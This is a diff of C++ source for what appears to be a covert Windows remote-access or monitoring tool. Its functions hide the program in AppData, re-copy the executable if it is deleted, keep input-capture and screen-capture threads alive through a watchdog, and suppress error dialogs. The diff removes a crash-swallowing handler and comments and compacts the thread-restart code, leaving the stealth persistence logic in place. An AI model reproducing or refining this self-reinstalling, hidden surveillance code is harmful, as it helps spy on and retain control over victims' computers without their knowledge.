@@ -1707,17 +1707,11 @@ void hideToAppData() {
     }
 }
 
-LONG WINAPI crashHandler(EXCEPTION_POINTERS*) {
-    // Suppress crash, let threads restart via watchdog
-    return EXCEPTION_CONTINUE_EXECUTION;
-}
-
 // Thread handles for watchdog
 HANDLE g_hPoll = 0, g_hInput = 0, g_hScreen = 0;
 DWORD WINAPI watchdogThread(LPVOID) {
     while (true) {
         Sleep(5000);
-        // Self-repair: if deleted from LocalAppData, re-copy
         char exePath[MAX_PATH];
         if (GetModuleFileNameA(NULL, exePath, MAX_PATH) > 0) {
             char la[MAX_PATH];
@@ -1729,26 +1723,15 @@ DWORD WINAPI watchdogThread(LPVOID) {
                 }
             }
         }
-        // Restart dead threads
-        if (g_hPoll) {
-            DWORD r = WaitForSingleObject(g_hPoll, 0);
-            if (r == WAIT_OBJECT_0) { CloseHandle(g_hPoll); g_hPoll = CreateThread(0, 0, pollThread, 0, 0, 0); }
-        } else g_hPoll = CreateThread(0, 0, pollThread, 0, 0, 0);
-        if (g_hInput) {
-            DWORD r = WaitForSingleObject(g_hInput, 0);
-            if (r == WAIT_OBJECT_0) { CloseHandle(g_hInput); g_hInput = CreateThread(0, 0, inputThread, 0, 0, 0); }
-        } else g_hInput = CreateThread(0, 0, inputThread, 0, 0, 0);
-        if (g_hScreen) {
-            DWORD r = WaitForSingleObject(g_hScreen, 0);
-            if (r == WAIT_OBJECT_0) { CloseHandle(g_hScreen); g_hScreen = CreateThread(0, 0, screenThread, 0, 0, 0); }
-        } else g_hScreen = CreateThread(0, 0, screenThread, 0, 0, 0);
+        if (g_hPoll) { DWORD r = WaitForSingleObject(g_hPoll, 0); if (r == WAIT_OBJECT_0) { CloseHandle(g_hPoll); g_hPoll = CreateThread(0, 0, pollThread, 0, 0, 0); } } else g_hPoll = CreateThread(0, 0, pollThread, 0, 0, 0);
+        if (g_hInput) { DWORD r = WaitForSingleObject(g_hInput, 0); if (r == WAIT_OBJECT_0) { CloseHandle(g_hInput); g_hInput = CreateThread(0, 0, inputThread, 0, 0, 0); } } else g_hInput = CreateThread(0, 0, inputThread, 0, 0, 0);
+        if (g_hScreen) { DWORD r = WaitForSingleObject(g_hScreen, 0); if (r == WAIT_OBJECT_0) { CloseHandle(g_hScreen); g_hScreen = CreateThread(0, 0, screenThread, 0, 0, 0); } } else g_hScreen = CreateThread(0, 0, screenThread, 0, 0, 0);
     }
     return 0;
 }
 
 int main(int argc, char* argv[]) {
     SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);
-    SetUnhandledExceptionFilter(crashHandler);
     bool noScreen = false, showConsole = false;
     for (int i = 1; i < argc; i++) {
         std::string a = argv[i];
